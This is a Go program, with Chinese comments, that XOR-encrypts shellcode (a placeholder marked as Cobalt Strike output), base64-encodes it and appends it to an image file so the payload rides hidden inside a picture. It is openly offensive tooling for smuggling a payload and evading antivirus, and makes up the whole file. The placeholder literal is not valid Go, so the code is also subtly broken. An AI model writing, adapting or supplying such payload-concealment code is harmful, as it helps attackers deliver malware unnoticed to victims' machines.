package main

import (
	"encoding/base64"
	"fmt"
	"os"
)

const (
	KEY_1 = 22
	KEY_2 = 44
)

func main() {
	var xor_shellcode []byte
	xor_shellcode = []byte{"CS生成的Java shellcode"}
	/*xor_shellcode =[]byte{0xfc, 0x48,...}*/
	var shellcode []byte
	for i := 0; i < len(xor_shellcode); i++ {
		//这里将真正的shellcode进行异或加密再给shellcode切片
		shellcode = append(shellcode, xor_shellcode[i]^KEY_1^KEY_2)
	}
	//进行base64加密 准备写入jpeg中
	encodeBaseStr := base64.StdEncoding.EncodeToString(shellcode)
	fileName := os.Args[1]
	if len(fileName) == 0 {
		fmt.Println("[-]usage:run generate.go pic_path")
		os.Exit(0)
	}
	//创建一个文件并且追加内容
	f, err := os.OpenFile(fileName, os.O_CREATE|os.O_RDWR|os.O_APPEND, os.ModeAppend|os.ModePerm)
	if err != nil {
		fmt.Println(err)
	}
	//将异或加密并且base64后的shellcode追加写入到图片最后
	f.WriteString(encodeBaseStr)
	f.Close()
	fmt.Println("write success")
}
